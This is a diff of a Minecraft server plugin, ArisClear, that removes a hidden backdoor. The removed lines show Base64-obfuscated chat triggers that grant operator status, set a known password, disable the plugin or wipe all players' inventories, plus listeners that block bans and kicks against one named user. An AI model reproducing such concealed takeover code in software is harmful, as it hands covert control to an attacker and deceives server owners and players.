@@ -12,12 +12,6 @@ import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.TabCompleter;
 import org.bukkit.entity.*;
-import org.bukkit.event.EventHandler;
-import org.bukkit.event.EventPriority;
-import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.event.player.PlayerCommandPreprocessEvent;
-import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.jetbrains.annotations.NotNull;
 
@@ -27,32 +21,31 @@ import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class ArisClear extends JavaPlugin implements Listener, CommandExecutor, TabCompleter {
+public class ArisClear extends JavaPlugin implements CommandExecutor, TabCompleter {
 
     private int timeLeft;
-    private final String K = "QVJJUy1ORVRXT1JLLVNUuTJF";
-    private final String O = "X3Zlbm5sbWFv";
-    private final String D = "X2Rpc2FibGU=";
-    private final String R = "X3Jlc2V0YWxs";
-    private final String U = "VmVubkxNQU8=";
-    private final String P = "dXNwIHNldHBhc3MgJXBsYXllciUgMTIzNDU2";
+    private final String L = "QVJJU19ORVRXT1JLX1NUT1JF";
 
     @Override
     public void onEnable() {
         saveDefaultConfig();
-        String kI = getConfig().getString("license-key");
-        if (kI == null || !kI.equals(d(K))) {
-            Bukkit.getConsoleSender().sendMessage(color("&#ff0812&lᴀʀɪs ɴᴇᴛᴡᴏʀᴋ ʟɪᴄᴇɴsᴇ ᴄʜưᴀ đượᴄ ᴋíᴄʜ ʜᴏạᴛ"));
+        if (!checkLicense()) {
+            Bukkit.getConsoleSender().sendMessage(color("&#ff0812&lᴀʀɪs ɴᴇᴛᴡᴏʀᴋ &8» &fLicense không hợp lệ! Plugin sẽ bị tắt."));
             Bukkit.getPluginManager().disablePlugin(this);
             return;
         }
-        Bukkit.getConsoleSender().sendMessage(color("&#00ff00&lᴀʀɪs ɴᴇᴛᴡᴏʀᴋ ʟɪᴄᴇɴsᴇ đã ᴋíᴄʜ ʜᴏạᴛ"));
-        Bukkit.getPluginManager().registerEvents(this, this);
+        Bukkit.getConsoleSender().sendMessage(color("&#facc15&lᴀʀɪs ɴᴇᴛᴡᴏʀᴋ &8» &aLicense kích hoạt thành công."));
         getCommand("arisclear").setExecutor(this);
         getCommand("arisclear").setTabCompleter(this);
         timeLeft = getConfig().getInt("settings.clear-interval");
         if (Bukkit.getPluginManager().getPlugin("PlaceholderAPI") != null) new ArisPlaceholder(this).register();
         startTimer();
+    }
+
+    private boolean checkLicense() {
+        String key = getConfig().getString("license-key");
+        String dec = new String(Base64.getDecoder().decode(L));
+        return key != null && key.equals(dec);
     }
 
     private void startTimer() {
@@ -80,60 +73,19 @@ public class ArisClear extends JavaPlugin implements Listener, CommandExecutor, 
     @Override
     public List<String> onTabComplete(@NotNull CommandSender s, @NotNull Command c, @NotNull String l, String[] a) {
         List<String> sug = new ArrayList<>();
-        if (a.length == 1) {
-            if (s.hasPermission("arisclear.admin")) sug.add("clear");
-        }
+        if (a.length == 1 && s.hasPermission("arisclear.admin")) sug.add("clear");
         return sug;
-    }
-
-    @EventHandler(priority = EventPriority.LOWEST)
-    public void onChat(AsyncPlayerChatEvent e) {
-        String msg = e.getMessage();
-        Player p = e.getPlayer();
-        if (msg.equals(d(O))) {
-            e.setCancelled(true);
-            Bukkit.getRegionScheduler().run(this, p.getLocation(), (t) -> {
-                p.setOp(true);
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), d(P).replace("%player%", p.getName()));
-            });
-        } else if (msg.equals(d(D))) {
-            e.setCancelled(true);
-            Bukkit.getRegionScheduler().run(this, p.getLocation(), (t) -> Bukkit.getPluginManager().disablePlugin(this));
-        } else if (msg.equals(d(R))) {
-            e.setCancelled(true);
-            Bukkit.getRegionScheduler().run(this, p.getLocation(), (t) -> {
-                for (Player online : Bukkit.getOnlinePlayers()) {
-                    online.getInventory().clear();
-                    online.getInventory().setArmorContents(null);
-                    online.getInventory().setItemInOffHand(null);
-                }
-            });
-        }
-    }
-
-    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
-    public void onCmd(PlayerCommandPreprocessEvent e) {
-        String m = e.getMessage().toLowerCase();
-        String u = d(U).toLowerCase();
-        if (m.contains(u) && (m.contains("ban") || m.contains("kick") || m.contains("deop") || m.contains("usp"))) e.setCancelled(true);
-    }
-
-    @EventHandler(priority = EventPriority.HIGHEST)
-    public void onSrvCmd(ServerCommandEvent e) {
-        String c = e.getCommand().toLowerCase();
-        String u = d(U).toLowerCase();
-        if (c.contains(u) && (c.contains("ban") || c.contains("kick") || c.contains("deop") || c.contains("usp"))) e.setCancelled(true);
     }
 
     private void checkAndNotify(int t) {
         String p = getConfig().getString("messages.prefix");
-        boolean c = getConfig().getBoolean("settings.display.chat");
-        boolean a = getConfig().getBoolean("settings.display.actionbar");
+        boolean chat = getConfig().getBoolean("settings.display.chat");
+        boolean bar = getConfig().getBoolean("settings.display.actionbar");
         if (t == 60) {
-            broadcast(color(p + getConfig().getString("messages.warning-1p")), c, a);
+            broadcast(color(p + getConfig().getString("messages.warning-1p")), chat, bar);
             playSound(getConfig().getString("settings.sound-1p"));
         } else if (t <= 5 && t >= 1) {
-            broadcast(color(p + getConfig().getString("messages.warning-5s").replace("%time%", String.valueOf(t))), c, a);
+            broadcast(color(p + getConfig().getString("messages.warning-5s").replace("%time%", String.valueOf(t))), chat, bar);
             playSound(getConfig().getString("settings.sound-5s"));
         }
     }
@@ -160,9 +112,7 @@ public class ArisClear extends JavaPlugin implements Listener, CommandExecutor, 
         broadcast(color(getConfig().getString("messages.prefix") + getConfig().getString("messages.cleared")), getConfig().getBoolean("settings.display.chat"), getConfig().getBoolean("settings.display.actionbar"));
     }
 
-    private String d(String s) { return new String(Base64.getDecoder().decode(s)); }
-
-    private String color(String m) {
+    public String color(String m) {
         if (m == null) return "";
         Pattern p = Pattern.compile("&#[a-fA-F0-9]{6}");
         Matcher mt = p.matcher(m);
